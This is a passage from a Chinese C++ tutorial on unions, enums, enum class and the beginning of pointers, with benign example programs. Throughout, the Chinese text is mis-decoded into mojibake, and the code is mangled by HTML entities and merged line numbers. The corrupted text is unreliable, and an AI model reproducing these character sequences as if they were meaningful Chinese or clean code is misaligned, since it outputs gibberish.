struct ç±»ä¼¼ã€‚ 12345union UnionName &#123; memberType1 memberName1; memberType2 memberName2; // ... more members&#125;; // æ³¨æ„å®šä¹‰æœ«å°¾çš„åˆ†å· è®¿é—®æˆå‘˜: ä¸ç»“æ„ä½“ä¸€æ ·ï¼Œä½¿ç”¨æˆå‘˜è¿ç®—ç¬¦ï¼ˆç‚¹è¿ç®—ç¬¦ .) æ¥è®¿é—®å…±ç”¨ä½“å˜é‡çš„æˆå‘˜ã€‚ ç”¨æ³•ä¸ç¤ºä¾‹: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#include &lt;iostream&gt;// å®šä¹‰ä¸€ä¸ªå…±ç”¨ä½“ï¼Œå¯ä»¥å­˜å‚¨ int, long æˆ– doubleunion DataValue &#123; int i_val; long l_val; double d_val;&#125;;int main() &#123; DataValue data; // å£°æ˜ä¸€ä¸ª DataValue å…±ç”¨ä½“å˜é‡ std::cout &lt;&lt; &quot;Size of DataValue union: &quot; &lt;&lt; sizeof(DataValue) &lt;&lt; &quot; bytes&quot; &lt;&lt; std::endl; // è¾“å‡ºçš„å¤§å°é€šå¸¸ç­‰äº sizeof(double)ï¼Œå› ä¸ºå®ƒæ˜¯æœ€å¤§çš„æˆå‘˜ // å­˜å‚¨å¹¶ä½¿ç”¨ int æˆå‘˜ data.i_val = 100; std::cout &lt;&lt; &quot;Stored as int: &quot; &lt;&lt; data.i_val &lt;&lt; std::endl; // æ­¤æ—¶è®¿é—® l_val æˆ– d_val çš„ç»“æœæ˜¯æœªå®šä¹‰çš„/æ— æ„ä¹‰çš„ // å­˜å‚¨å¹¶ä½¿ç”¨ double æˆå‘˜ (ä¼šè¦†ç›–ä¹‹å‰çš„ int å€¼) data.d_val = 3.14159; std::cout &lt;&lt; &quot;Stored as double: &quot; &lt;&lt; data.d_val &lt;&lt; std::endl; // æ­¤æ—¶è®¿é—® i_val æˆ– l_val çš„ç»“æœæ˜¯æœªå®šä¹‰çš„/æ— æ„ä¹‰çš„ // std::cout &lt;&lt; &quot;Reading i_val after storing double: &quot; &lt;&lt; data.i_val &lt;&lt; std::endl; // ç»“æœä¸å¯é  // å­˜å‚¨å¹¶ä½¿ç”¨ long æˆå‘˜ (ä¼šè¦†ç›–ä¹‹å‰çš„ double å€¼) data.l_val = 1234567890L; std::cout &lt;&lt; &quot;Stored as long: &quot; &lt;&lt; data.l_val &lt;&lt; std::endl; // --- è¿½è¸ªå½“å‰æœ‰æ•ˆæˆå‘˜ --- // é€šå¸¸éœ€è¦ä¸€ä¸ªé¢å¤–çš„å˜é‡æ¥è®°å½•å½“å‰å“ªä¸ªæˆå‘˜æ˜¯æœ‰æ•ˆçš„ enum DataType &#123; INT, LONG, DOUBLE &#125;; struct DataPacket &#123; DataType type; // è®°å½•å½“å‰å­˜å‚¨çš„æ•°æ®ç±»å‹ DataValue value; // å…±ç”¨ä½“å­˜å‚¨å®é™…å€¼ &#125;; DataPacket packet; packet.type = INT; packet.value.i_val = 255; // æ ¹æ®ç±»å‹è®¿é—® if (packet.type == INT) &#123; std::cout &lt;&lt; &quot;Packet contains int: &quot; &lt;&lt; packet.value.i_val &lt;&lt; std::endl; &#125; // ... å…¶ä»–ç±»å‹çš„æ£€æŸ¥ return 0;&#125; é‡è¦: ç¨‹åºå‘˜æœ‰è´£ä»»è·Ÿè¸ªå…±ç”¨ä½“ä¸­å½“å‰å“ªä¸ªæˆå‘˜æ˜¯æ´»åŠ¨çš„ï¼ˆæœ‰æ•ˆçš„ï¼‰ã€‚è¯»å–éæ´»åŠ¨æˆå‘˜çš„å€¼ä¼šå¯¼è‡´æœªå®šä¹‰è¡Œä¸ºæˆ–å¾—åˆ°æ— æ„ä¹‰çš„æ•°æ®ã€‚é€šå¸¸ä¼šç»“åˆä¸€ä¸ªæšä¸¾ç±»å‹æˆ–æ•´æ•°æ ‡å¿—æ¥æŒ‡ç¤ºå½“å‰å­˜å‚¨çš„æ•°æ®ç±»å‹ï¼Œå¦‚ DataPacket ç¤ºä¾‹æ‰€ç¤ºã€‚ åŒ¿åå…±ç”¨ä½“ (Anonymous Union): å…±ç”¨ä½“å¯ä»¥ä¸å¸¦åç§°ç›´æ¥å®šä¹‰åœ¨ç»“æ„ä½“æˆ–ç±»å†…éƒ¨ï¼ˆæˆ–å‡½æ•°å±€éƒ¨ä½œç”¨åŸŸï¼‰ã€‚åŒ¿åå…±ç”¨ä½“çš„æˆå‘˜å¯ä»¥ç›´æ¥é€šè¿‡ç»“æ„/ç±»å˜é‡è®¿é—®ï¼Œå°±åƒå®ƒä»¬æ˜¯ç»“æ„/ç±»çš„ç›´æ¥æˆå‘˜ä¸€æ ·ã€‚åŒ¿åå…±ç”¨ä½“çš„æ‰€æœ‰æˆå‘˜ä»ç„¶å…±äº«ç›¸åŒçš„å†…å­˜ã€‚ 123456789101112131415161718192021222324252627#include &lt;iostream&gt;struct Widget &#123; char type; // &#x27;I&#x27; for integer, &#x27;F&#x27; for float union &#123; // åŒ¿åå…±ç”¨ä½“ int intVal; float floatVal; &#125;; // æ³¨æ„è¿™é‡Œæ²¡æœ‰å˜é‡å&#125;;int main() &#123; Widget w; w.type = &#x27;I&#x27;; w.intVal = 123; // ç›´æ¥è®¿é—®åŒ¿åå…±ç”¨ä½“çš„æˆå‘˜ if (w.type == &#x27;I&#x27;) &#123; std::cout &lt;&lt; &quot;Widget value (int): &quot; &lt;&lt; w.intVal &lt;&lt; std::endl; &#125; else if (w.type == &#x27;F&#x27;) &#123; // w.floatVal = 3.14f; // å¦‚æœè¦å­˜ float // std::cout &lt;&lt; &quot;Widget value (float): &quot; &lt;&lt; w.floatVal &lt;&lt; std::endl; &#125; std::cout &lt;&lt; &quot;Size of Widget: &quot; &lt;&lt; sizeof(Widget) &lt;&lt; std::endl; // å¤§å°é€šå¸¸æ˜¯ char çš„å¤§å° + æœ€å¤§æˆå‘˜(int æˆ– float)çš„å¤§å° + å¯èƒ½çš„å¯¹é½å¡«å…… return 0;&#125; ä½¿ç”¨åœºæ™¯: èŠ‚çœå†…å­˜: å½“æ•°æ®é¡¹æœ‰å¤šç§å¯èƒ½ç±»å‹ï¼Œä½†ä¸€æ¬¡åªä½¿ç”¨ä¸€ç§æ—¶ã€‚ ç±»å‹åŒå…³ (Type Punning): ä»¥ä¸åŒçš„ç±»å‹è§£é‡ŠåŒä¸€å—å†…å­˜åŒºåŸŸï¼ˆä¾‹å¦‚ï¼Œå°†ä¸€ä¸ª float çš„ä½æ¨¡å¼è§£é‡Šä¸ºä¸€ä¸ª intï¼‰ã€‚è¿™æ˜¯ä¸€ç§ä½çº§æŠ€å·§ï¼Œé€šå¸¸ä¸å¯ç§»æ¤ä¸”å¯èƒ½è¿å C++ çš„ä¸¥æ ¼åˆ«åè§„åˆ™ (strict aliasing rules)ï¼Œåº”è°¨æ…ä½¿ç”¨æˆ–é¿å…ã€‚ ä¸ç»“æ„çš„æ¯”è¾ƒ: å†…å­˜: ç»“æ„çš„æ‰€æœ‰æˆå‘˜éƒ½æœ‰è‡ªå·±ç‹¬ç«‹çš„å†…å­˜åœ°å€ï¼›å…±ç”¨ä½“çš„æ‰€æœ‰æˆå‘˜å…±äº«èµ·å§‹åœ°å€ã€‚ å¤§å°: ç»“æ„çš„å¤§å°çº¦ç­‰äºå…¶æ‰€æœ‰æˆå‘˜å¤§å°ä¹‹å’Œï¼ˆåŠ ä¸Šå¯èƒ½çš„å¯¹é½å¡«å……ï¼‰ï¼›å…±ç”¨ä½“çš„å¤§å°ç­‰äºå…¶æœ€å¤§æˆå‘˜çš„å¤§å°ã€‚ æœ‰æ•ˆæ€§: ç»“æ„çš„æ‰€æœ‰æˆå‘˜å¯ä»¥åŒæ—¶æœ‰æ•ˆï¼›å…±ç”¨ä½“åªæœ‰ä¸€ä¸ªæˆå‘˜èƒ½åŒæ—¶æœ‰æ•ˆã€‚ C++11 åŠä»¥åçš„å…±ç”¨ä½“: C++11 æ”¾å®½äº†å¯¹å…±ç”¨ä½“æˆå‘˜ç±»å‹çš„é™åˆ¶ï¼Œå…è®¸åŒ…å«å…·æœ‰éå¹³å‡¡æ„é€ å‡½æ•°ã€ææ„å‡½æ•°æˆ–èµ‹å€¼è¿ç®—ç¬¦çš„ç±»ç±»å‹æˆå‘˜ï¼ˆå¦‚ std::stringï¼‰ã€‚ä½†æ˜¯ï¼Œå¦‚æœå…±ç”¨ä½“åŒ…å«è¿™æ ·çš„æˆå‘˜ï¼Œç¼–è¯‘å™¨ä¸ä¼šè‡ªåŠ¨ç”Ÿæˆé»˜è®¤çš„æ„é€ å‡½æ•°ã€ææ„å‡½æ•°æˆ–å¤åˆ¶/ç§»åŠ¨æ“ä½œã€‚ç¨‹åºå‘˜å¿…é¡»æ‰‹åŠ¨ç®¡ç†è¿™äº›æˆå‘˜çš„ç”Ÿå‘½å‘¨æœŸï¼ˆä¾‹å¦‚ï¼Œä½¿ç”¨ placement new åœ¨å…±ç”¨ä½“å†…å­˜ä¸Šæ„é€ å¯¹è±¡ï¼Œå¹¶åœ¨ä¸å†éœ€è¦æ—¶æ˜¾å¼è°ƒç”¨ææ„å‡½æ•°ï¼‰ã€‚è¿™ä½¿å¾—åŒ…å«å¤æ‚ç±»å‹çš„å…±ç”¨ä½“ä½¿ç”¨èµ·æ¥æ›´åŠ å¤æ‚å’Œæ˜“é”™ã€‚å¯¹äºåªåŒ…å« POD (Plain Old Data) ç±»å‹ï¼ˆå¦‚ int, float, æŒ‡é’ˆ, C é£æ ¼æ•°ç»„/ç»“æ„ï¼‰çš„å…±ç”¨ä½“ï¼Œå…¶è¡Œä¸ºä¸ C è¯­è¨€ä¸­ç±»ä¼¼ã€‚ 4.6 æšä¸¾C++ çš„ enum å·¥å…·æä¾›äº†ä¸€ç§åˆ›å»ºç¬¦å·å¸¸é‡ (Symbolic Constant) çš„æ–¹å¼ï¼Œå¸¸ç”¨äºå®šä¹‰ä¸€ç»„ç›¸å…³çš„ã€å…·æœ‰åç§°çš„æ•´æ•°å¸¸é‡ã€‚è¿™æ¯”ä½¿ç”¨ const int æˆ– #define æ¥å®šä¹‰ä¸€ç»„ç›¸å…³å¸¸é‡æ›´æ–¹ä¾¿ã€æ›´å…·å¯è¯»æ€§ã€‚ åŸºæœ¬æ¦‚å¿µ: æšä¸¾ç±»å‹ (Enumeration Type): enum å…³é”®å­—ç”¨äºåˆ›å»ºä¸€ä¸ªæ–°çš„ç”¨æˆ·å®šä¹‰çš„æ•´æ•°ç±»å‹ã€‚ æšä¸¾é‡ (Enumerator): åœ¨æšä¸¾ç±»å‹å®šä¹‰ä¸­åˆ—å‡ºçš„æ ‡è¯†ç¬¦ã€‚å®ƒä»¬æ˜¯å…·åçš„å¸¸é‡ï¼Œä»£è¡¨æ•´æ•°å€¼ã€‚ å®šä¹‰æšä¸¾: ä½¿ç”¨ enum å…³é”®å­—ï¼Œåè·Ÿæšä¸¾ç±»å‹çš„åç§°ï¼Œç„¶ååœ¨èŠ±æ‹¬å· &#123;&#125; å†…åˆ—å‡ºæšä¸¾é‡ï¼Œç”¨é€—å·åˆ†éš”ã€‚ 1enum spectrum &#123;red, orange, yellow, green, blue, violet, indigo, ultraviolet&#125;; å·¥ä½œåŸç†: åˆ›å»ºæ–°ç±»å‹: ä¸Šè¿°è¯­å¥åˆ›å»ºäº†ä¸€ä¸ªåä¸º spectrum çš„æ–°ç±»å‹ã€‚ å®šä¹‰æšä¸¾é‡: red, orange, yellow ç­‰æˆä¸º spectrum ç±»å‹çš„ç¬¦å·å¸¸é‡ã€‚ è‡ªåŠ¨èµ‹å€¼: é»˜è®¤æƒ…å†µä¸‹ï¼Œç¼–è¯‘å™¨å°†æ•´æ•°å€¼èµ‹ç»™æšä¸¾é‡ï¼Œä» 0 å¼€å§‹ï¼Œä¾æ¬¡é€’å¢ 1ã€‚ red å€¼ä¸º 0 orange å€¼ä¸º 1 yellow å€¼ä¸º 2 â€¦ ultraviolet å€¼ä¸º 7 å£°æ˜å’Œä½¿ç”¨æšä¸¾å˜é‡: å¯ä»¥åƒä½¿ç”¨å…¶ä»–ç±»å‹ä¸€æ ·å£°æ˜æšä¸¾ç±»å‹çš„å˜é‡ã€‚æšä¸¾å˜é‡é€šå¸¸åªèƒ½è¢«èµ‹äºˆè¯¥æšä¸¾ç±»å‹ä¸­å®šä¹‰çš„æšä¸¾é‡ã€‚ 12345678910111213141516171819202122232425262728293031323334#include &lt;iostream&gt;enum spectrum &#123;red, orange, yellow, green, blue, violet, indigo, ultraviolet&#125;;int main() &#123; spectrum band; // å£°æ˜ä¸€ä¸ª spectrum ç±»å‹çš„å˜é‡ band band = blue; // å°†æšä¸¾é‡ blue èµ‹ç»™ band (åˆæ³•) std::cout &lt;&lt; &quot;Current band (enum value): &quot; &lt;&lt; band &lt;&lt; std::endl; // è¾“å‡º blue å¯¹åº”çš„æ•´æ•°å€¼ 5 // band = 2000; // é”™è¯¯! ä¸èƒ½ç›´æ¥å°†æ•´æ•°èµ‹ç»™æšä¸¾å˜é‡ (ç±»å‹ä¸åŒ¹é…) // band = red + orange; // é”™è¯¯! + è¿ç®—ç¬¦æœªå¯¹æšä¸¾ç±»å‹å®šä¹‰ (è™½ç„¶ red å’Œ orange æœ‰æ•´æ•°å€¼) // å¯ä»¥å°†æšä¸¾é‡èµ‹ç»™ int å˜é‡ (æšä¸¾é‡ä¼šè‡ªåŠ¨æå‡ä¸º int) int colorCode = green; std::cout &lt;&lt; &quot;Color code for green: &quot; &lt;&lt; colorCode &lt;&lt; std::endl; // è¾“å‡º 3 // å¯ä»¥å¼ºåˆ¶å°† int è½¬æ¢ä¸ºæšä¸¾ç±»å‹ (éœ€è¦æ˜¾å¼è½¬æ¢ï¼Œä¸”éœ€è°¨æ…) band = static_cast&lt;spectrum&gt;(3); // å°† 3 è½¬æ¢ä¸º spectrum ç±»å‹ (å¯¹åº” green) std::cout &lt;&lt; &quot;Band after cast: &quot; &lt;&lt; band &lt;&lt; std::endl; // è¾“å‡º 3 // æ¯”è¾ƒ if (band == green) &#123; std::cout &lt;&lt; &quot;The band is green.&quot; &lt;&lt; std::endl; &#125; // åœ¨å¾ªç¯ä¸­ä½¿ç”¨ (éœ€è¦æ³¨æ„ç±»å‹è½¬æ¢å’ŒèŒƒå›´) for (band = red; band &lt;= ultraviolet; band = static_cast&lt;spectrum&gt;(band + 1)) &#123; std::cout &lt;&lt; &quot;Processing band: &quot; &lt;&lt; band &lt;&lt; std::endl; &#125; return 0;&#125; æšä¸¾çš„ä¼˜ç‚¹: æé«˜å¯è¯»æ€§: ä½¿ç”¨æœ‰æ„ä¹‰çš„åç§°ï¼ˆå¦‚ red, blueï¼‰ä»£æ›¿ç¥ç§˜çš„æ•°å­—ï¼ˆ0, 4ï¼‰ã€‚ ç±»å‹å®‰å…¨: æšä¸¾åˆ›å»ºäº†æ–°çš„ç±»å‹ï¼Œæœ‰åŠ©äºé˜²æ­¢å°†ä¸ç›¸å…³çš„æ•´æ•°å€¼èµ‹ç»™æšä¸¾å˜é‡ï¼ˆè™½ç„¶å¯ä»¥é€šè¿‡å¼ºåˆ¶è½¬æ¢ç»•è¿‡ï¼‰ã€‚ ä»£ç ç»´æŠ¤: å¦‚æœéœ€è¦æ›´æ”¹æŸä¸ªå¸¸é‡çš„å€¼æˆ–æ·»åŠ æ–°å¸¸é‡ï¼Œåªéœ€ä¿®æ”¹æšä¸¾å®šä¹‰ã€‚ 4.6.1 è®¾ç½®æšä¸¾é‡çš„å€¼å¯ä»¥æ˜¾å¼åœ°ä¸ºæšä¸¾é‡æŒ‡å®šæ•´æ•°å€¼ã€‚ è§„åˆ™: ä½¿ç”¨èµ‹å€¼è¿ç®—ç¬¦ = ä¸ºæšä¸¾é‡æŒ‡å®šå€¼ã€‚ æœªè¢«æ˜¾å¼èµ‹å€¼çš„æšä¸¾é‡çš„å€¼å°†åŸºäºå‰ä¸€ä¸ªæšä¸¾é‡çš„å€¼åŠ  1ã€‚ ç¬¬ä¸€ä¸ªæšä¸¾é‡å¦‚æœæœªæ˜¾å¼èµ‹å€¼ï¼Œé»˜è®¤ä¸º 0ã€‚ ä¸åŒçš„æšä¸¾é‡å¯ä»¥å…·æœ‰ç›¸åŒçš„å€¼ã€‚ ç”¨æ³•ä¸ç¤ºä¾‹: 12345678910111213141516171819202122232425262728#include &lt;iostream&gt;enum BitField &#123; BIT_ZERO, // é»˜è®¤å€¼ä¸º 0 BIT_ONE, // é»˜è®¤å€¼ä¸º 1 BIT_TWO = 4, // æ˜¾å¼èµ‹å€¼ä¸º 4 BIT_THREE, // å€¼ä¸º BIT_TWO + 1 = 5 BIT_FOUR = 8, // æ˜¾å¼èµ‹å€¼ä¸º 8 BIT_FIVE = 8, // æ˜¾å¼èµ‹å€¼ä¸º 8 (ä¸ BIT_FOUR ç›¸åŒ) BIT_SIX, // å€¼ä¸º BIT_FIVE + 1 = 9 BIT_SEVEN = BIT_THREE + BIT_FOUR // å€¼ä¸º 5 + 8 = 13&#125;;int main() &#123; std::cout &lt;&lt; &quot;BIT_ZERO: &quot; &lt;&lt; BIT_ZERO &lt;&lt; std::endl; // 0 std::cout &lt;&lt; &quot;BIT_ONE: &quot; &lt;&lt; BIT_ONE &lt;&lt; std::endl; // 1 std::cout &lt;&lt; &quot;BIT_TWO: &quot; &lt;&lt; BIT_TWO &lt;&lt; std::endl; // 4 std::cout &lt;&lt; &quot;BIT_THREE: &quot; &lt;&lt; BIT_THREE &lt;&lt; std::endl; // 5 std::cout &lt;&lt; &quot;BIT_FOUR: &quot; &lt;&lt; BIT_FOUR &lt;&lt; std::endl; // 8 std::cout &lt;&lt; &quot;BIT_FIVE: &quot; &lt;&lt; BIT_FIVE &lt;&lt; std::endl; // 8 std::cout &lt;&lt; &quot;BIT_SIX: &quot; &lt;&lt; BIT_SIX &lt;&lt; std::endl; // 9 std::cout &lt;&lt; &quot;BIT_SEVEN: &quot; &lt;&lt; BIT_SEVEN &lt;&lt; std::endl; // 13 BitField flags = BIT_THREE; std::cout &lt;&lt; &quot;Flags: &quot; &lt;&lt; flags &lt;&lt; std::endl; // 5 return 0;&#125; 4.6.2 æšä¸¾çš„å–å€¼èŒƒå›´è™½ç„¶æšä¸¾é‡æ˜¯ int ç±»å‹çš„å¸¸é‡ï¼Œä½†æšä¸¾ç±»å‹æœ¬èº« (spectrum, BitField ç­‰) çš„å–å€¼èŒƒå›´å¹¶ä¸ä¸€å®šç­‰åŒäº intã€‚ C++98/03 æ ‡å‡†: åº•å±‚ç±»å‹ (Underlying Type): ç¼–è¯‘å™¨ä¼šé€‰æ‹©ä¸€ç§èƒ½å¤Ÿå®¹çº³æ‰€æœ‰æšä¸¾é‡å€¼çš„æ•´å‹ä½œä¸ºè¯¥æšä¸¾çš„åº•å±‚ç±»å‹ã€‚è¿™ä¸ªç±»å‹è‡³å°‘è¦å’Œ int ä¸€æ ·å¤§ï¼Œä½†å¦‚æœæ‰€æœ‰æšä¸¾é‡çš„å€¼å¯ä»¥ç”¨æ›´å°çš„ç±»å‹ï¼ˆå¦‚ char æˆ– shortï¼‰è¡¨ç¤ºï¼Œç¼–è¯‘å™¨å¯èƒ½ä¼šé€‰æ‹©æ›´å°çš„ç±»å‹æ¥èŠ‚çœå†…å­˜ã€‚ å–å€¼èŒƒå›´: æšä¸¾å˜é‡ç†è®ºä¸Šå¯ä»¥å­˜å‚¨çš„å€¼çš„èŒƒå›´ç”±å…¶åº•å±‚ç±»å‹å†³å®šã€‚ç„¶è€Œï¼ŒC++ æ ‡å‡†å¯¹æšä¸¾å˜é‡å¯ä»¥åˆæ³•æŒæœ‰çš„å€¼æœ‰æ›´ä¸¥æ ¼çš„è§„å®šã€‚ä¸€ä¸ªæšä¸¾å˜é‡å¯ä»¥æŒæœ‰çš„å€¼ï¼Œå…¶ä¸Šé™æ˜¯å¤§äºæœ€å¤§æšä¸¾é‡å€¼çš„æœ€å°çš„ 2 çš„å¹‚å‡ 1ï¼Œä¸‹é™ç±»ä¼¼ï¼ˆå¦‚æœå­˜åœ¨è´Ÿæšä¸¾é‡å€¼ï¼Œåˆ™ä¸ºå°äºæœ€å°æšä¸¾é‡å€¼çš„æœ€å¤§çš„ 2 çš„å¹‚åŠ  1ï¼›å¦‚æœæšä¸¾é‡éƒ½éè´Ÿï¼Œåˆ™ä¸‹é™ä¸º 0ï¼‰ã€‚ ä¾‹å¦‚ï¼Œå¯¹äº enum spectrum &#123;red=0, ..., ultraviolet=7&#125;ï¼Œæœ€å¤§æšä¸¾é‡æ˜¯ 7ã€‚å¤§äº 7 çš„æœ€å°çš„ 2 çš„å¹‚æ˜¯ 8ï¼Œæ‰€ä»¥ä¸Šé™æ˜¯ 8 - 1 = 7ã€‚ä¸‹é™æ˜¯ 0ã€‚å› æ­¤ï¼Œspectrum å˜é‡ç†è®ºä¸Šå¯ä»¥æŒæœ‰ 0 åˆ° 7 èŒƒå›´å†…çš„å€¼ã€‚ å¯¹äº enum BitField &#123;..., BIT_SEVEN=13&#125;ï¼Œæœ€å¤§æšä¸¾é‡æ˜¯ 13ã€‚å¤§äº 13 çš„æœ€å°çš„ 2 çš„å¹‚æ˜¯ 16ï¼Œä¸Šé™æ˜¯ 16 - 1 = 15ã€‚ä¸‹é™æ˜¯ 0ã€‚BitField å˜é‡ç†è®ºä¸Šå¯ä»¥æŒæœ‰ 0 åˆ° 15 èŒƒå›´å†…çš„å€¼ã€‚ èµ‹å€¼é™åˆ¶: å°½ç®¡èŒƒå›´å¯èƒ½æ¯”æšä¸¾é‡çš„å€¼åŸŸå®½ï¼Œä½† C++ é€šå¸¸ä¸å…è®¸ç›´æ¥å°†è¶…å‡ºæšä¸¾é‡å®šä¹‰èŒƒå›´çš„æ•´æ•°å€¼èµ‹ç»™æšä¸¾å˜é‡ï¼ˆå³ä½¿è¯¥æ•´æ•°åœ¨ç†è®ºèŒƒå›´å†…ï¼‰ï¼Œéœ€è¦æ˜¾å¼ç±»å‹è½¬æ¢ã€‚ C++11 ä½œç”¨åŸŸå†…æšä¸¾ (Scoped Enumeration): C++11 å¼•å…¥äº† enum class (æˆ– enum struct)ï¼Œç§°ä¸ºä½œç”¨åŸŸå†…æšä¸¾ï¼Œæä¾›äº†æ›´å¼ºçš„ç±»å‹å®‰å…¨å’Œä½œç”¨åŸŸæ§åˆ¶ï¼š å¼ºç±»å‹: enum class çš„æšä¸¾é‡ä¸ä¼šéšå¼è½¬æ¢ä¸ºæ•´æ•°ã€‚ ä½œç”¨åŸŸ: æšä¸¾é‡çš„åç§°è¢«é™åˆ¶åœ¨æšä¸¾ç±»å‹çš„ä½œç”¨åŸŸå†…ï¼Œè®¿é—®æ—¶éœ€è¦ä½¿ç”¨ EnumType::Enumeratorã€‚ å¯æŒ‡å®šåº•å±‚ç±»å‹: å¯ä»¥æ˜¾å¼æŒ‡å®šåº•å±‚æ•´æ•°ç±»å‹ï¼Œä¾‹å¦‚ enum class Color : unsigned char &#123; Red, Green, Blue &#125;;ã€‚ æ— éšå¼è½¬æ¢: ä¸èƒ½å°†æ•´æ•°ç›´æ¥èµ‹ç»™ enum class å˜é‡ï¼Œä¹Ÿä¸èƒ½å°† enum class å˜é‡éšå¼è½¬æ¢ä¸ºæ•´æ•°ï¼Œéƒ½éœ€è¦æ˜¾å¼è½¬æ¢ (static_cast)ã€‚ ç”¨æ³•ä¸ç¤ºä¾‹ (èŒƒå›´å’Œ C++11): 12345678910111213141516171819202122232425262728293031#include &lt;iostream&gt;enum OldEnum &#123; A = 1, B = 2, C = 4 &#125;; // æœ€å¤§å€¼ 4, èŒƒå›´å¯èƒ½æ˜¯ 0-7// C++11 ä½œç”¨åŸŸå†…æšä¸¾enum class NewEnum &#123; X = 10, Y = 20, Z = 30 &#125;; enum class Status : char &#123; OK = &#x27;O&#x27;, Error = &#x27;E&#x27;, Pending = &#x27;P&#x27; &#125;; // æŒ‡å®šåº•å±‚ç±»å‹ä¸º charint main() &#123; OldEnum oe; // oe = 7; // ç¼–è¯‘é”™è¯¯ (é€šå¸¸ä¸å…è®¸ç›´æ¥èµ‹ int) oe = static_cast&lt;OldEnum&gt;(7); // åˆæ³• (å› ä¸º 7 åœ¨ç†è®ºèŒƒå›´ 0-7 å†…) std::cout &lt;&lt; &quot;OldEnum value: &quot; &lt;&lt; oe &lt;&lt; std::endl; // è¾“å‡º 7 // oe = static_cast&lt;OldEnum&gt;(8); // è¡Œä¸ºæœªå®šä¹‰æˆ–å¯èƒ½ç¼–è¯‘é”™è¯¯ (è¶…å‡ºç†è®ºèŒƒå›´) NewEnum ne = NewEnum::Y; // å¿…é¡»ä½¿ç”¨ä½œç”¨åŸŸè§£æç¬¦ // int ne_val = ne; // é”™è¯¯! ä¸èƒ½éšå¼è½¬æ¢ä¸º int int ne_val = static_cast&lt;int&gt;(ne); // éœ€è¦æ˜¾å¼è½¬æ¢ std::cout &lt;&lt; &quot;NewEnum value as int: &quot; &lt;&lt; ne_val &lt;&lt; std::endl; // è¾“å‡º 20 // ne = 20; // é”™è¯¯! ä¸èƒ½å°† int èµ‹ç»™ enum class ne = static_cast&lt;NewEnum&gt;(10); // éœ€è¦æ˜¾å¼è½¬æ¢ std::cout &lt;&lt; &quot;NewEnum value after cast: &quot; &lt;&lt; static_cast&lt;int&gt;(ne) &lt;&lt; std::endl; // è¾“å‡º 10 Status s = Status::OK; char s_char = static_cast&lt;char&gt;(s); // è½¬æ¢ä¸ºåº•å±‚ç±»å‹ char std::cout &lt;&lt; &quot;Status as char: &quot; &lt;&lt; s_char &lt;&lt; std::endl; // è¾“å‡º O return 0;&#125; æ€»ç»“:ä¼ ç»Ÿçš„ enum æä¾›äº†ä¸€ç§åˆ›å»ºå‘½åå¸¸é‡çš„æ–¹å¼ï¼Œä½†ç±»å‹å®‰å…¨è¾ƒå¼±ï¼Œä¸”æšä¸¾é‡ä¼šæ±¡æŸ“æ‰€åœ¨çš„ä½œç”¨åŸŸã€‚C++11 çš„ enum class æä¾›äº†æ›´å¼ºçš„ç±»å‹å®‰å…¨å’Œä½œç”¨åŸŸæ§åˆ¶ï¼Œæ˜¯ç°ä»£ C++ ä¸­æ›´æ¨èçš„é€‰æ‹©ã€‚åœ¨ä½¿ç”¨ä¼ ç»Ÿ enum æ—¶ï¼Œè¦æ³¨æ„å…¶å–å€¼èŒƒå›´å’Œä¸æ•´æ•°ç±»å‹è½¬æ¢çš„è§„åˆ™ã€‚ 4.7 æŒ‡é’ˆå’Œè‡ªç”±å­˜å‚¨ç©ºé—´åˆ°ç›®å‰ä¸ºæ­¢ï¼Œæˆ‘ä»¬åˆ›å»ºçš„å˜é‡ï¼ˆåŒ…æ‹¬æ•°ç»„ã€ç»“æ„ç­‰ï¼‰åœ¨å£°æ˜æ—¶ï¼Œç¼–è¯‘å™¨ä¼šä¸ºå…¶åˆ†é…å†…å­˜ã€‚è¿™äº›å˜é‡çš„å†…å­˜ç®¡ç†æ˜¯è‡ªåŠ¨çš„ï¼ˆè‡ªåŠ¨å­˜å‚¨æˆ–é™æ€å­˜å‚¨ï¼‰ã€‚ä½†æ˜¯ï¼Œæœ‰æ—¶æˆ‘ä»¬éœ€è¦åœ¨ç¨‹åºè¿è¡Œæ—¶æ ¹æ®éœ€è¦åŠ¨æ€åœ°åˆ†é…å’Œé‡Šæ”¾å†…å­˜ã€‚æŒ‡é’ˆ (Pointer) å’Œ è‡ªç”±å­˜å‚¨ç©ºé—´ (Free Store)**ï¼ˆä¹Ÿå¸¸ç§°ä¸ºå † Heap**ï¼‰æ˜¯å®ç°è¿™ä¸€ç›®æ ‡çš„å…³é”®ã€‚ æŒ‡é’ˆæ˜¯ä¸€ç§ç‰¹æ®Šçš„å˜é‡ï¼Œå®ƒå­˜å‚¨çš„æ˜¯å¦ä¸€ä¸ªå˜é‡çš„å†…å­˜åœ°å€ã€‚é€šè¿‡æŒ‡é’ˆï¼Œæˆ‘ä»¬å¯ä»¥é—´æ¥åœ°è®¿é—®å’Œä¿®æ”¹è¯¥å†…å­˜åœ°å€å¤„çš„æ•°æ®ã€‚ è‡ªç”±å­˜å‚¨ç©ºé—´æ˜¯ç¨‹åºå¯ä»¥åŠ¨æ€ç”³è¯·ä½¿ç”¨çš„å†…å­˜åŒºåŸŸã€‚ä¸è‡ªåŠ¨å˜é‡ï¼ˆå‡½æ•°æ‰§è¡Œå®Œå°±é”€æ¯ï¼‰æˆ–é™æ€å˜é‡ï¼ˆç¨‹åºæ•´ä¸ªç”Ÿå‘½å‘¨æœŸéƒ½å­˜åœ¨ï¼‰ä¸åŒï¼Œç¨‹åºå‘˜éœ€è¦æ‰‹åŠ¨ç®¡ç†è‡ªç”±å­˜å‚¨ç©ºé—´ä¸­åˆ†é…çš„å†…å­˜çš„ç”Ÿå‘½å‘¨æœŸã€‚ 4.7.1 å£°æ˜å’Œåˆå§‹åŒ–æŒ‡é’ˆå£°æ˜æŒ‡é’ˆ: å£°æ˜æŒ‡é’ˆéœ€è¦æŒ‡å®šå®ƒå°†æŒ‡å‘çš„æ•°æ®ç±»å‹ï¼Œå¹¶åœ¨å˜é‡åå‰åŠ ä¸Šæ˜Ÿå· *ï¼ˆæ˜Ÿå·å¯ä»¥é è¿‘ç±»å‹åã€å˜é‡åæˆ–åœ¨ä¸¤è€…ä¹‹é—´ï¼‰ã€‚ 1typeName * pointerName; typeName: æŒ‡é’ˆå°†è¦æŒ‡å‘çš„æ•°æ®çš„ç±»å‹ã€‚ *: è¡¨æ˜ pointerName æ˜¯ä¸€ä¸ªæŒ‡é’ˆã€‚ pointerName: æŒ‡é’ˆå˜é‡çš„åç§°ã€‚ ç¤ºä¾‹: 1234int * p_int; // å£°æ˜ä¸€ä¸ªæŒ‡å‘ int 